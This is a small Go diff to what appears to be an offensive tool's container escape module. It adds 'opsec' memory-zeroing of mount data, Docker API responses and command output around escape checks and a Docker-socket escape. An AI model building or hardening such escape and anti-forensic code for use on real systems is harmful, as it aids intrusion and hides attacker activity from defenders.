@@ -175,6 +175,7 @@ func escapeCheck() (string, string) {
 
 	// 9. Mounted host filesystems
 	if data, err := os.ReadFile("/proc/mounts"); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear mount info (may reveal host paths)
 		for _, line := range strings.Split(string(data), "\n") {
 			fields := strings.Fields(line)
 			if len(fields) >= 2 {
@@ -284,6 +285,7 @@ func escapeDockerSock(command, image string) (string, string) {
 	if err != nil {
 		return fmt.Sprintf("Failed to create container: %v", err), "error"
 	}
+	defer structs.ZeroBytes(out) // opsec: clear Docker API response
 
 	// Parse container ID
 	var createResp struct {
@@ -309,6 +311,7 @@ func escapeDockerSock(command, image string) (string, string) {
 
 	// Get logs
 	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
+	defer structs.ZeroBytes(logs) // opsec: clear container command output
 
 	sb.WriteString("\n--- Output ---\n")
 	// Docker logs have 8-byte header per line; strip it
